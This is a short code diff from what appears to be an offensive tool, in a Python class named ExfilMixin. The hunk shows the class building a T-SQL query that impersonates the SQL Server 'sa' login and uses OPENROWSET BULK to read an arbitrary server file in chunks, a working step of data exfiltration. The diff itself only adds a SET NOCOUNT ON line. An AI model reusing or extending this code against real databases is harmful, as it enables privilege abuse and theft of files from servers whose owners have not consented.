@@ -187,6 +187,7 @@ class ExfilMixin:
         chunk_bytes = chunk_mb * 1048576
         return (
             "EXECUTE AS LOGIN='sa';"
+            "SET NOCOUNT ON;"
             "DECLARE @data VARBINARY(MAX);"
             f"SELECT @data=BulkColumn FROM OPENROWSET(BULK "
             f"'{self._tsql_escape(remote_path)}',SINGLE_BLOB) AS t;"
